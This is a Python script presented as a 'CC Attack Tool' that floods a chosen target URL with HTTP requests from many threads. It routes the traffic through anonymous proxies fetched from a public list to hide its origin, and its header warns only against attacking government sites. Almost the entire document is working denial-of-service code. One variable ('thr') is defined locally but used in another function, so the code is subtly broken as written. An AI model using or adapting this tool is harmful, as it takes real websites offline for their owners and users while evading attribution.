###########################################
#	This Script Is Code By GogoZin    #
#	Can Use In Stress Test            #
#	But Don't Attack Any Gov Site     #
#	If Want Me To Keep Update         #
###########################################
import requests
import sys
import time
import random
import threading
from colorama import Fore

print(Fore.GREEN + """MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMWNKOkxddddxkOKNWMMMMMMMMMMMM
MMMMMMMMMW0xllloodxxxxdollllx0WMMMMMMMMM
MMMMMMMXxccoOXWMMMMMMMMMNklccccxXMMMMMMM
MMMMMNk:ckNMMMMMMMMMMMMMMXo',cl::kNMMMMM
MMMMXo;dNMMMMMMMMNOkOXMMMMX: .'ll;oXMMMM
MMMXl;kWMMMMMMMMMKl;cOWMMMNl.  .:o;lXMMM
MMWd,xWMMMMMMMMMMMWNWWMMMMO,    .co,dWMM
MMK::XMMMMMMMMMMMMMMMMMMNk,.     'o::XMM
MM0;lWMMMMMMMMMMMWNXK0Od;.       .ll;0MM
MM0;lNMMMMMMMMW0o:,....          .oc;0MM
MMXc;KMMMMMMMXo.                 ,d;cXMM
MMWk;oNMMMMMWo.   .;:,.         .ll;kWMM
MMMWd;dNMMMMXc   .:OKx'        .ll;xWMMM
MMMMWk:c0WMMWd.   ..'..      .:oc:kWMMMM
MMMMMWKo:lONMNx,.         .,clc:oKWMMMMM
MMMMMMMWKdccok0Odl:;,;;:::ccccdKWMMMMMMM
MMMMMMMMMMN0xollllllllllllox0NMMMMMMMMMM
MMMMMMMMMMMMMMWNXK0000KXNWMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
""")
print(Fore.CYAN + "   CC Attack Tool Using Requests Module")
print(Fore.CYAN + "          \\\\Proxy Version//")
print(Fore.CYAN + "       Code By GogoZin. -2019/8/2")
print(Fore.RED + "##Update Add Https And Anonymous Proxies##")

def opth():
	for i in range(thr):
		x = threading.Thread(target=atk)
		x.start()
		print("Threads " + str(i+1)+ " Created ")
		time.sleep(0.01)
	print("Wait A Few Seconds For Threads Ready To Attack ...")

def main():
	global pprr
	global list
	global proxy
	global url
	global pow
	url = str(input(Fore.YELLOW + "Target : " + Fore.WHITE))
	thr = int(input(Fore.YELLOW + "Threads : " + Fore.WHITE))
	po = str(input(Fore.YELLOW + "Port : " + Fore.WHITE))
	cho = str(input(Fore.YELLOW + "Get Some Fresh Proxies ? (y/n) : " + Fore.WHITE))
	if cho =='y':
		if po =='80':
			rsp = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=http&timeout=1000&country=all&ssl=all&anonymity=all') # Code By GogoZin
			with open("proxies.txt","wb") as fp:
				fp.write(rsp.content)
				print(Fore.CYAN + "Sucess Download Proxies List !")
		else:
			rsp = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=http&timeout=1000&country=all&ssl=yes&anonymity=all') # Code By GogoZin
			with open("proxies.txt","wb") as fp:
				fp.write(rsp.content)
				print(Fore.CYAN + "Sucess Download Https Proxies List !")
	else:
		pass
	list = str(input(Fore.YELLOW + "Proxies List (proxies.txt): " + Fore.WHITE))
	pow = int(input(Fore.YELLOW + "CC.Power (1-100) :" + Fore.WHITE))
	opth()
	
def atk():
	pprr = open(list).readlines()
	proxy = random.choice(pprr).strip().split(":")
	s = requests.session()
	s.proxies = {}
	s.proxies['http'] = ("http://"+str(proxy[0])+":"+str(proxy[1]))
	s.proxies['https'] = ("http://"+str(proxy[0])+":"+str(proxy[1]))
	time.sleep(10)
	while True:
		try:
			s.get(url)
			print(Fore.GREEN + "From ~ [ " + Fore.WHITE + str(proxy[0])+":"+str(proxy[1]) + Fore.GREEN + " ] " + Fore.GREEN + " Target-> " + Fore.WHITE + str(url)) #Code By GogoZin
			try:
				for y in range(pow):
					s.get(url)
			except:
				s.close()
		except:
			s.close()
			print(Fore.RED + "[!]Couldn't Connect To Proxy" + Fore.WHITE)


if __name__ == "__main__":
	main()
